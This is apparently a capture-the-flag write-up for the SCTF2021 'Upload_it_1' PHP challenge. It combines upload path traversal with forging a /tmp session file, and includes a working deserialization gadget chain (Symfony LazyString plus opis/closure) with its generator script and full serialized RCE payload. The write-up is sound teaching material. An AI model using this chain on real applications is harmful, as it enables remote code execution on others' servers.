# [SCTF2021]Upload_it_1复现闭包组件反序列化rce


# 题目地址
SycloverTeam提供了题目的docker环境
https://github.com/SycloverTeam/SCTF2021/tree/master/web/Upload_it_1
# wp
首先题目给了composer.json
```
{
    "name": "sctf2021/upload",
    "authors": [
        {
            "name": "AFKL",
            "email": "upload@qq.com"
        }
    ],
    "require": {
        "symfony/string": "^5.3",
        "opis/closure": "^3.6"
    }
}
```
导入了两个包，那就肯定是组件相关的攻击了
```
"symfony/string": "^5.3",
"opis/closure": "^3.6"
```
composer update一下

![在这里插入图片描述](https://img-blog.csdnimg.cn/20e5d9324d4747ab93b8929ee3fad478.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

第二个组件是关于闭包反序列化的，所以猜测和序列化有关
![在这里插入图片描述](https://img-blog.csdnimg.cn/fb6af44b8bb746db86d41328ee7752e9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)




index.php内的主要逻辑代码
```php
if (!empty($_POST['path'])) {
    $upload_file_path = $_SESSION["upload_path"]."/".$_POST['path'];
    $upload_file = $upload_file_path."/".$file['name'];
} else {
    $upload_file_path = $_SESSION["upload_path"];
    $upload_file = $_SESSION["upload_path"]."/".$file['name'];
}

if (move_uploaded_file($file['tmp_name'], $upload_file)) {
    echo "OK! Your file saved in: " . $upload_file;
} else {
    echo "emm...Upload failed:(";
}
} else {
echo "too big!!!";
}
```
这里会调用`$_SESSION["upload_path"]`，那么考虑到session反序列化
题目测试到，上传可以进行目录穿越，但是只有tmp目录可写

![在这里插入图片描述](https://img-blog.csdnimg.cn/2fdd65dc82ed4b349ae79743419ac2fd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)



题目有给到phpinfo()，打开看一下，path没给，但是能操作的目录只有tmp，那么肯定就是/tmp/sess_xxxx了

![在这里插入图片描述](https://img-blog.csdnimg.cn/d628cc1bba3545c1be887421822e90f2.png)

那么我们就是可以操控session文件了，所以我们现在的目的就是怎么去构造一个session文件去rce
可以看到index.php里面session拼接了：` $_SESSION["upload_path"]."/".$_POST['path'];`
所以如果` $_SESSION["upload_path"]`是一个对象的话，那就会触发一个__toString方法了
那么我们就去找一个可以利用的__toString方法，这里是可以利用的在LazyString这里找到利用的方法

![在这里插入图片描述](https://img-blog.csdnimg.cn/3108d16f83294fecb5eb4cd68d4e1bcd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

再看到这个组件，opis/closure，可序列化闭包，那么我们就可以通过创建一个攻击性的闭包去反序列化，这样完成我们的攻击
那么如此，我们就可以构造我们的exp了

```php
<?php

namespace Symfony\Component\String {
    class LazyString {
        private $value;
        public function __construct($a){
            $this->value = $a;
        }
    }
}

namespace {
    include_once "../vendor/autoload.php";
    $func = function() {system("cat /flag");};
    $raw = \Opis\Closure\serialize($func);
    $data = unserialize($raw);
    $exp = new \Symfony\Component\String\LazyString($data);
    echo urlencode(serialize($exp));
}
```
payload，注意%00的解码，前面拼接上`upload_path|`
```php
upload_path|O:35:"Symfony\Component\String\LazyString":1:{s:42:"%00Symfony\Component\String\LazyString%00value";C:32:"Opis\Closure\SerializableClosure":157:{a:5:{s:3:"use";a:0:{}s:8:"function";s:34:"function() {\system("cat /flag");}";s:5:"scope";N;s:4:"this";N;s:4:"self";s:32:"0000000045e636f7000000007352e912";}}}
```


![在这里插入图片描述](https://img-blog.csdnimg.cn/88a2f5b18f02475e8a764f21e9781eea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

再次上传文件，利用session去拼接调用__toString方法，成功rce

![在这里插入图片描述](https://img-blog.csdnimg.cn/0fffc8f42fc54f519e72a8611e9e1c43.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

# 预期解
看了作者给的wp，发现预期解是通过__sleep方法去调用__toString方法的

![在这里插入图片描述](https://img-blog.csdnimg.cn/c40530e72fb84051a0e4d17f03d676c5.png)

而php原生的session执行反序列化的时候，的确会调用__sleep方法

# 思路
这道题的整个的思路就是：
- 首先测试到上传的文件可以进行目录穿越，但是只有tmp目录有权限
- 源码中观察到闭包反序列化组件，方向可能是反序列化，执行composer update安装源码
- 有session的使用，可以上传文件到tmp，而且有session的使用，而且phpinfo中有写是file，所以考虑到是session反序列化
- 构造闭包去序列化打rce


